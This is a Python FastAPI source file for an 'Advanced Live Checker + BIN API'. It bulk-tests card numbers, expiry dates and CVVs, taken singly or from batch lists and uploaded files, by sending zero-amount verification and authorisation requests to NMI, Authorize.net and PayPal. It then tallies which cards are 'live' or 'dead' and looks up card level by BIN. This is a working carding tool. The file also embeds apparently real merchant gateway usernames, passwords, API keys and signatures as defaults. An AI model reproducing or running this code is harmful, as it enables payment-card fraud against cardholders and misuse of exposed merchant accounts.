from fastapi import FastAPI, UploadFile, File, Depends, HTTPException, Security
from fastapi.security import HTTPAuthorizationCredentials, HTTPBearer
import requests
import re
import time
import random
import hashlib
from typing import Dict, List, Optional, Any
from datetime import datetime
import json
import os
import logging
from pydantic import BaseModel

# ================== LOGGING ==================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI(title="Advanced Live Checker + BIN API")
security = HTTPBearer()

# ================== AUTH ==================
AUTH_TOKEN = os.getenv("AUTH_TOKEN", "b9f3k7m2v8t3w5z1q6p9c4b7n2v8m2025")
MOCK_MODE = os.getenv("MOCK_MODE", "false").lower() in {"1", "true", "yes", "on"}

def verify_auth(credentials: HTTPAuthorizationCredentials = Security(security)):
    if credentials.credentials != AUTH_TOKEN:
        raise HTTPException(status_code=401, detail="Geçersiz token")
    return credentials.credentials

# ================== MODELS ==================
class CardCheckRequest(BaseModel):
    pan: Optional[str] = None
    cardNumber: Optional[str] = None
    exp: Optional[str] = None
    expMonth: Optional[str] = None
    expYear: Optional[str] = None
    cvv: Optional[str] = None
    cvv2: Optional[str] = None
    cvc: Optional[str] = None
    zip: Optional[str] = None
    billingZip: Optional[str] = None
    postalCode: Optional[str] = None
    holderName: Optional[str] = None
    provider: Optional[str] = "clover"  # clover, amazonpay, authorizenet, paypal
    operation: Optional[str] = "verification"  # verification, auth, sale
    amount: Optional[float] = 0.1
    currency: Optional[str] = "USD"
    liveMode: Optional[str] = "verification"
    providerPaymentToken: Optional[str] = None
    source: Optional[str] = None
    token: Optional[str] = None
    chargePermissionId: Optional[str] = None
    binCheckOnlyIfLive: Optional[bool] = False

class BatchCheckRequest(BaseModel):
    cards: List[str]
    provider: Optional[str] = "clover"
    operation: Optional[str] = "verification"

# ================== HELPER FUNCTIONS ==================
def digits_only(value: Any) -> str:
    """Sadece rakamları döndür"""
    if value is None:
        return ""
    return re.sub(r'\D', '', str(value))

def normalize_expiry(value: Any) -> Optional[Dict]:
    """Expiry değerini normalize et"""
    if not value:
        return None
    
    text = str(value).strip()
    compact = digits_only(text)
    
    month = ""
    year = ""
    
    if "/" in text or "-" in text:
        parts = re.split(r'[/-]', text)
        month = digits_only(parts[0]) if len(parts) > 0 else ""
        year = digits_only(parts[1]) if len(parts) > 1 else ""
    elif len(compact) >= 4:
        month = compact[:2]
        year = compact[2:4] if len(compact) >= 4 else ""
        if len(compact) >= 6:
            year = compact[2:6]
    
    if not month or not year:
        return None
    
    month = month.zfill(2)
    if len(year) == 2:
        year = f"20{year}"
    
    if not re.match(r'^(0[1-9]|1[0-2])$', month) or not re.match(r'^\d{4}$', year):
        return None
    
    return {
        "month": month,
        "year": year,
        "label": f"{month}/{year[-2:]}"
    }

def normalize_card_input(payload: Dict) -> Dict:
    """Kart girdisini normalize et"""
    pan = digits_only(
        payload.get("pan") or 
        payload.get("cardNumber") or 
        payload.get("cardnumber") or 
        payload.get("number") or 
        ""
    )
    
    expiry = normalize_expiry(
        payload.get("exp") or 
        payload.get("expiry") or 
        f"{payload.get('expMonth', '')}/{payload.get('expYear', '')}"
    )
    
    if len(pan) < 12 or len(pan) > 19:
        raise ValueError("cardnumber must be 12-19 digits")
    
    if not expiry:
        raise ValueError("exp must be MM/YY or MM/YYYY")
    
    return {
        "pan": pan,
        "expMonth": expiry["month"],
        "expYear": expiry["year"],
        "exp": expiry["label"],
        "cvv": str(payload.get("cvv") or payload.get("cvv2") or payload.get("cvc") or "").strip(),
        "zip": str(payload.get("zip") or payload.get("billingZip") or payload.get("postalCode") or "00000").strip() or "00000",
        "holderName": str(payload.get("holderName") or payload.get("cardholderName") or payload.get("name") or "").strip(),
        "address": str(payload.get("address") or payload.get("billingAddress") or "").strip()
    }

def parse_card_line(line: str) -> Dict:
    """Kart satırını parse et - Format: pan|month|year|cvv|zip|holderName"""
    parts = [p.strip() for p in str(line).strip().split("|") if p.strip()]
    
    if len(parts) < 3:
        raise ValueError("Invalid card format. Need at least: pan|month|year|cvv")
    
    # Format: pan|month|year|cvv|zip|holderName
    pan = parts[0]
    month = parts[1] if len(parts) > 1 else ""
    year = parts[2] if len(parts) > 2 else ""
    cvv = parts[3] if len(parts) > 3 else ""
    zip_code = parts[4] if len(parts) > 4 else "00000"
    holder = parts[5] if len(parts) > 5 else ""
    
    return normalize_card_input({
        "cardNumber": pan,
        "exp": f"{month}/{year}",
        "cvv": cvv,
        "zip": zip_code,
        "holderName": holder
    })

def mask_pan(pan: str) -> str:
    """PAN'i maskele"""
    digits = digits_only(pan)
    if len(digits) < 10:
        return digits
    return f"{digits[:6]}******{digits[-4:]}"

# ================== BIN LOOKUP ==================
class BinLookup:
    def __init__(self):
        self.cache = {}
        self.binlist_url = "https://lookup.binlist.net/"
        
    def get_bin_info(self, bin_number: str) -> Dict:
        """BIN sorgulama - Level bilgisi dahil"""
        bin_6 = digits_only(bin_number)[:6]
        
        if bin_6 in self.cache:
            logger.info(f"[BIN] Cache'den alındı: {bin_6}")
            return self.cache[bin_6]
        
        result = {
            "bin": bin_6,
            "brand": "UNKNOWN",
            "type": "UNKNOWN",
            "level": "UNKNOWN",
            "level_detail": "UNKNOWN",
            "bank": "Unknown",
            "country": "XX",
            "country_name": "Unknown",
            "currency": "USD",
            "prepaid": False,
            "commercial": False,
            "source": "none",
            "valid": False
        }
        
        try:
            logger.info(f"[BIN] Sorgulanıyor: {bin_6}")
            r = requests.get(f"{self.binlist_url}{bin_6}", timeout=10, 
                           headers={"Accept-Version": "3"})
            if r.status_code == 200:
                data = r.json()
                bank = data.get("bank", {})
                country = data.get("country", {})
                brand = data.get("scheme", "UNKNOWN").upper()
                brand_name = data.get("brand", "").upper()
                
                # Level belirleme
                level = "STANDARD"
                if "PLATINUM" in brand_name:
                    level = "PLATINUM"
                elif "GOLD" in brand_name:
                    level = "GOLD"
                elif "TITANIUM" in brand_name:
                    level = "TITANIUM"
                elif "SIGNATURE" in brand_name:
                    level = "SIGNATURE"
                elif "INFINITE" in brand_name:
                    level = "INFINITE"
                elif "WORLD" in brand_name:
                    level = "WORLD"
                elif "BUSINESS" in brand_name:
                    level = "BUSINESS"
                
                result.update({
                    "brand": brand,
                    "type": data.get("type", "UNKNOWN").upper(),
                    "level": level,
                    "level_detail": f"{level} card - {bank.get('name', 'Unknown')}",
                    "bank": bank.get("name", "Unknown"),
                    "country": country.get("alpha2", "XX"),
                    "country_name": country.get("name", "Unknown"),
                    "currency": country.get("currency", "USD"),
                    "prepaid": data.get("prepaid", False),
                    "commercial": data.get("commercial", False),
                    "source": "binlist.net",
                    "valid": True
                })
                logger.info(f"[BIN] Başarılı: {result['bank']} - {result['level']}")
        except Exception as e:
            logger.warning(f"[BIN] Hata: {e}")
        
        self.cache[bin_6] = result
        return result

bin_lookup = BinLookup()

# ================== PROVIDER SERVICES ==================

class ProviderService:
    """Tüm provider'lar için servis sınıfı"""
    
    def __init__(self):
        # NMI Credentials
        self.nmi_config = {
            "username": os.getenv("NMI_API_USERNAME", "bygreenllc"),
            "password": os.getenv("NMI_API_PASSWORD", "Ak1f1987@..."),
            "api_key": os.getenv("NMI_API_SECURITY_KEY", "v4_secret_4A9387r9Kc44xHm3p2g2V28Qu9t3vb8X"),
            "url": "https://secure.nmi.com/api/transact.php"
        }
        
        # Authorize.net Credentials
        self.authorize_config = {
            "login_id": os.getenv("AUTHORIZE_LOGIN_ID", "6Px6beH4B4T"),
            "transaction_key": os.getenv("AUTHORIZE_TRANSACTION_KEY", "34677Ck24M5zvuTM"),
            "url": "https://api.authorize.net/xml/v1/request.api"
        }
        
        # PayPal Credentials
        self.paypal_config = {
            "username": os.getenv("PAYPAL_API_USERNAME", "gazanfarsirinov_api1.zohomail.eu"),
            "password": os.getenv("PAYPAL_API_PASSWORD", "OBOU2RJGGEHDMFZT"),
            "signature": os.getenv("PAYPAL_API_SIGNATURE", "AcMDoql-aVqyCJXCMFDSFlti7T7MA1GADoKxORsg6qHLCm2sGHW9aJ2R"),
            "nvp_url": os.getenv("PAYPAL_NVP_BASE_URL", "https://api-3t.paypal.com/nvp")
        }
        
        # Clover (mock)
        self.clover_config = {
            "token": os.getenv("CLOVER_TOKEN", "mock_clover_token"),
            "url": "https://api.clover.com/v1/charges"
        }
        
        # Amazon Pay (mock)
        self.amazon_config = {
            "merchant_id": os.getenv("AMAZON_MERCHANT_ID", ""),
            "url": "https://api.amazon.com/payments/v1"
        }
    
    # ========== NMI / CLOVER ==========
    async def clover_verify_card(self, card_data: Dict) -> Dict:
        """Clover/NMI verification"""
        if MOCK_MODE:
            is_live = random.random() < 0.15
            return {
                "status": "approved" if is_live else "declined",
                "transactionId": f"clv_{hashlib.md5(card_data['pan'].encode()).hexdigest()[:16]}",
                "provider": "clover",
                "isLive": is_live
            }
        
        try:
            data = {
                "username": self.nmi_config["username"],
                "password": self.nmi_config["password"],
                "ccnumber": card_data["pan"],
                "ccexp": f"{card_data['expMonth']}{card_data['expYear'][-2:]}",
                "cvv": card_data["cvv"],
                "type": "verify",
                "amount": "0.00"
            }
            
            response = requests.post(
                self.nmi_config["url"],
                data=data,
                timeout=15,
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )
            
            params = dict(x.split('=') for x in response.text.split('&'))
            response_code = params.get('response', '0')
            
            return {
                "status": "approved" if response_code == '1' else "declined",
                "transactionId": params.get('transactionid', ''),
                "authCode": params.get('authcode', ''),
                "responseCode": response_code,
                "responseText": params.get('responsetext', ''),
                "provider": "clover",
                "isLive": response_code == '1'
            }
            
        except Exception as e:
            logger.error(f"[CLOVER] Hata: {e}")
            return {"status": "error", "isLive": False, "error": str(e)}
    
    # ========== AUTHORIZE.NET ==========
    async def authorize_net_verify(self, card_data: Dict) -> Dict:
        """Authorize.net verification"""
        if MOCK_MODE:
            is_live = random.random() < 0.15
            return {
                "status": "approved" if is_live else "declined",
                "transactionId": f"auth_{hashlib.md5(card_data['pan'].encode()).hexdigest()[:16]}",
                "provider": "authorizenet",
                "isLive": is_live
            }
        
        try:
            xml_request = f"""<?xml version="1.0" encoding="utf-8"?>
            <createTransactionRequest xmlns="AnetApi/xml/v1/schema/AnetApiSchema.xsd">
                <merchantAuthentication>
                    <name>{self.authorize_config['login_id']}</name>
                    <transactionKey>{self.authorize_config['transaction_key']}</transactionKey>
                </merchantAuthentication>
                <transactionRequest>
                    <transactionType>authOnly</transactionType>
                    <amount>0.00</amount>
                    <payment>
                        <creditCard>
                            <cardNumber>{card_data['pan']}</cardNumber>
                            <expirationDate>{card_data['expYear']}-{card_data['expMonth']}</expirationDate>
                            <cardCode>{card_data['cvv']}</cardCode>
                        </creditCard>
                    </payment>
                </transactionRequest>
            </createTransactionRequest>"""
            
            response = requests.post(
                self.authorize_config["url"],
                data=xml_request,
                headers={"Content-Type": "application/xml"},
                timeout=15
            )
            
            # Parse XML
            root = ET.fromstring(response.text)
            for elem in root.getiterator():
                if '}' in elem.tag:
                    elem.tag = elem.tag.split('}', 1)[1]
            
            trans_response = root.find('.//transactionResponse')
            if trans_response is not None:
                response_code = trans_response.findtext('responseCode', '0')
                return {
                    "status": "approved" if response_code == '1' else "declined",
                    "transactionId": trans_response.findtext('transId', ''),
                    "authCode": trans_response.findtext('authCode', ''),
                    "responseCode": response_code,
                    "provider": "authorizenet",
                    "isLive": response_code == '1'
                }
            
            return {"status": "declined", "isLive": False, "provider": "authorizenet"}
            
        except Exception as e:
            logger.error(f"[AUTHORIZE] Hata: {e}")
            return {"status": "error", "isLive": False, "error": str(e)}
    
    # ========== PAYPAL ==========
    async def paypal_verify(self, card_data: Dict) -> Dict:
        """PayPal verification"""
        if MOCK_MODE:
            is_live = random.random() < 0.15
            return {
                "status": "approved" if is_live else "declined",
                "transactionId": f"pp_{hashlib.md5(card_data['pan'].encode()).hexdigest()[:16]}",
                "provider": "paypal",
                "isLive": is_live
            }
        
        try:
            # PayPal NVP API
            data = {
                "METHOD": "DoDirectPayment",
                "VERSION": "124.0",
                "USER": self.paypal_config["username"],
                "PWD": self.paypal_config["password"],
                "SIGNATURE": self.paypal_config["signature"],
                "PAYMENTACTION": "Authorization",
                "AMT": "0.00",
                "CREDITCARDTYPE": "Visa",
                "ACCT": card_data["pan"],
                "EXPDATE": f"{card_data['expMonth']}{card_data['expYear'][-2:]}",
                "CVV2": card_data["cvv"],
                "FIRSTNAME": "Test",
                "LASTNAME": "User",
                "STREET": "123 Main St",
                "CITY": "New York",
                "STATE": "NY",
                "ZIP": card_data.get("zip", "10001"),
                "COUNTRYCODE": "US"
            }
            
            response = requests.post(
                self.paypal_config["nvp_url"],
                data=data,
                timeout=15
            )
            
            params = dict(x.split('=') for x in response.text.split('&'))
            ack = params.get('ACK', 'Failure')
            
            return {
                "status": "approved" if ack.upper() == "SUCCESS" else "declined",
                "transactionId": params.get('TRANSACTIONID', ''),
                "correlationId": params.get('CORRELATIONID', ''),
                "provider": "paypal",
                "isLive": ack.upper() == "SUCCESS"
            }
            
        except Exception as e:
            logger.error(f"[PAYPAL] Hata: {e}")
            return {"status": "error", "isLive": False, "error": str(e)}
    
    # ========== AMAZON PAY ==========
    async def amazon_pay_verify(self, card_data: Dict, charge_permission_id: str = None) -> Dict:
        """Amazon Pay verification"""
        if not charge_permission_id and MOCK_MODE:
            charge_permission_id = f"amzn_perm_{hashlib.md5(card_data['pan'].encode()).hexdigest()[:16]}"
        
        if MOCK_MODE:
            is_live = random.random() < 0.15
            return {
                "status": "approved" if is_live else "declined",
                "chargePermissionId": charge_permission_id,
                "provider": "amazonpay",
                "isLive": is_live
            }
        
        # Gerçek Amazon Pay API entegrasyonu
        # Burada gerçek API çağrısı yapılır
        return {
            "status": "declined",
            "provider": "amazonpay",
            "isLive": False,
            "error": "Amazon Pay API not configured"
        }

provider_service = ProviderService()

# ================== CARD CHECK FUNCTIONS ==================

async def bin_check_card(card_data: Dict) -> Dict:
    """BIN kontrolü yap"""
    pan = card_data.get("pan", "")
    bin_6 = digits_only(pan)[:6]
    
    if not bin_6 or len(bin_6) < 6:
        return {
            "status": "failed",
            "bin": bin_6,
            "error": "Invalid BIN"
        }
    
    bin_info = bin_lookup.get_bin_info(bin_6)
    
    return {
        "status": "passed" if bin_info.get("valid") else "failed",
        "bin": bin_6,
        "summary": {
            "brand": bin_info.get("brand"),
            "type": bin_info.get("type"),
            "level": bin_info.get("level"),
            "bank": bin_info.get("bank"),
            "country": bin_info.get("country"),
            "countryName": bin_info.get("country_name"),
            "currency": bin_info.get("currency"),
            "prepaid": bin_info.get("prepaid"),
            "commercial": bin_info.get("commercial")
        },
        "raw": bin_info
    }

async def live_check_card(card_data: Dict, provider: str = "clover", operation: str = "verification") -> Dict:
    """Canlı kart kontrolü yap"""
    
    provider = provider.lower()
    
    if provider == "clover":
        result = await provider_service.clover_verify_card(card_data)
    elif provider == "authorizenet":
        result = await provider_service.authorize_net_verify(card_data)
    elif provider == "paypal":
        result = await provider_service.paypal_verify(card_data)
    elif provider == "amazonpay":
        result = await provider_service.amazon_pay_verify(card_data)
    else:
        raise ValueError(f"Unsupported provider: {provider}")
    
    return {
        "status": result.get("status"),
        "isLive": result.get("isLive", False),
        "provider": provider,
        "operation": operation,
        "transactionId": result.get("transactionId") or result.get("transaction_id"),
        "authCode": result.get("authCode") or result.get("auth_code"),
        "responseCode": result.get("responseCode"),
        "responseText": result.get("responseText"),
        "raw": result
    }

async def check_card(card_input: Dict, provider: str = "clover", operation: str = "verification") -> Dict:
    """Kart kontrolü (BIN + Live)"""
    
    try:
        card_data = normalize_card_input(card_input)
    except ValueError as e:
        return {
            "status": "error",
            "error": str(e)
        }
    
    masked_pan = mask_pan(card_data["pan"])
    
    # 1. BIN Check
    bin_result = await bin_check_card(card_data)
    
    # 2. Live Check
    live_result = await live_check_card(card_data, provider, operation)
    
    # 3. Sonucu birleştir
    return {
        "status": "passed" if live_result.get("isLive") else "review",
        "card": {
            "pan": masked_pan,
            "exp": card_data["exp"],
            "zip": card_data["zip"],
            "holder": card_data.get("holderName", "")
        },
        "live": live_result,
        "binCheck": bin_result,
        "provider": provider,
        "timestamp": datetime.now().isoformat()
    }

# ================== API ENDPOINTS ==================

@app.get("/")
async def home():
    return {
        "status": "API aktif",
        "mock_mode": MOCK_MODE,
        "providers": ["clover", "authorizenet", "paypal", "amazonpay"],
        "endpoints": [
            "/check (POST)",
            "/check/batch (POST)",
            "/check/file (POST)",
            "/bin/lookup (POST)",
            "/health (GET)"
        ],
        "auth_required": "Bearer token ile"
    }

@app.get("/health")
async def health():
    return {
        "status": "healthy",
        "mock_mode": MOCK_MODE,
        "timestamp": datetime.now().isoformat()
    }

@app.post("/check")
async def check_single_card(
    request: CardCheckRequest,
    auth: str = Depends(verify_auth)
):
    """Tek kart kontrolü"""
    try:
        # Request'i dict'e çevir
        payload = request.dict(exclude_none=True)
        
        # Provider ve operation'ı al
        provider = payload.pop("provider", "clover")
        operation = payload.pop("operation", "verification")
        
        result = await check_card(payload, provider, operation)
        return result
        
    except Exception as e:
        logger.error(f"[API] Hata: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/check/batch")
async def check_batch_cards(
    request: BatchCheckRequest,
    auth: str = Depends(verify_auth)
):
    """Toplu kart kontrolü"""
    try:
        results = []
        provider = request.provider or "clover"
        operation = request.operation or "verification"
        
        for card_line in request.cards:
            try:
                # Kart satırını parse et
                card_data = parse_card_line(card_line)
                result = await check_card(card_data, provider, operation)
                results.append(result)
            except Exception as e:
                results.append({
                    "status": "error",
                    "error": str(e),
                    "raw": card_line
                })
            
            # Rate limiting
            time.sleep(0.5)
        
        # İstatistikler
        total = len(results)
        live = sum(1 for r in results if r.get("status") == "passed")
        dead = sum(1 for r in results if r.get("status") == "review")
        errors = sum(1 for r in results if r.get("status") == "error")
        
        return {
            "total": total,
            "live": live,
            "dead": dead,
            "errors": errors,
            "results": results,
            "provider": provider
        }
        
    except Exception as e:
        logger.error(f"[API] Hata: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/check/file")
async def check_file(
    file: UploadFile,
    provider: str = "clover",
    auth: str = Depends(verify_auth)
):
    """Dosyadan kart kontrolü"""
    try:
        content = await file.read()
        text = content.decode('utf-8')
        lines = [line.strip() for line in text.split('\n') if line.strip() and not line.startswith('#')]
        
        results = []
        for line in lines:
            try:
                card_data = parse_card_line(line)
                result = await check_card(card_data, provider)
                results.append(result)
            except Exception as e:
                results.append({
                    "status": "error",
                    "error": str(e),
                    "raw": line
                })
            time.sleep(0.5)
        
        total = len(results)
        live = sum(1 for r in results if r.get("status") == "passed")
        dead = sum(1 for r in results if r.get("status") == "review")
        
        return {
            "total": total,
            "live": live,
            "dead": dead,
            "results": results
        }
        
    except Exception as e:
        logger.error(f"[API] Hata: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/bin/lookup")
async def lookup_bin(
    bin_number: str,
    auth: str = Depends(verify_auth)
):
    """BIN sorgulama"""
    try:
        bin_clean = digits_only(bin_number)[:6]
        if len(bin_clean) < 6:
            raise HTTPException(status_code=400, detail="Invalid BIN (need 6 digits)")
        
        result = bin_lookup.get_bin_info(bin_clean)
        return result
        
    except Exception as e:
        logger.error(f"[API] BIN lookup hatası: {e}")
        raise HTTPException(status_code=500, detail=str(e))

# ================== RUN ==================
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=10000)